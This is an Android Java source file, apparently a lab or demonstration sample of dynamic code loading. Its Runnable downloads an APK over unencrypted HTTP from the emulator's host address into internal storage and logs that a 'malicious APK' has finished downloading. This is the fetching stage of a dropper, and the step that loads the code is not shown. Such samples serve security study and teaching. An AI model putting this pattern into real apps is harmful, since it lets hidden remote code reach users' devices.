package com.a.dexclassloaderfromapk;


import android.content.Context;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;

public class DownloaderRunnable implements Runnable {
    private Context applicationContext;

    public DownloaderRunnable(Context applicationContext) {
        this.applicationContext = applicationContext;
    }

    @Override
    public void run() {
        try {

            URL url = new URL("http://10.0.2.2:8888/app-debug.apk");
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("GET");
            urlConnection.connect();

            //Create new file in internal storage
            File file = new File(applicationContext.getFilesDir().getAbsolutePath(), "app-debug.apk");
            FileOutputStream fileOutput = new FileOutputStream(file);
            InputStream inputStream = urlConnection.getInputStream();
            byte[] buffer = new byte[1024];
            int bufferLength = 0;

            while ((bufferLength = inputStream.read(buffer)) > 0) {
                fileOutput.write(buffer, 0, bufferLength);
            }
            fileOutput.close();
            Log.i("DownloaderRunnable", "DOWNLOADING MALICIOUS APK FINISHED!!!");
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
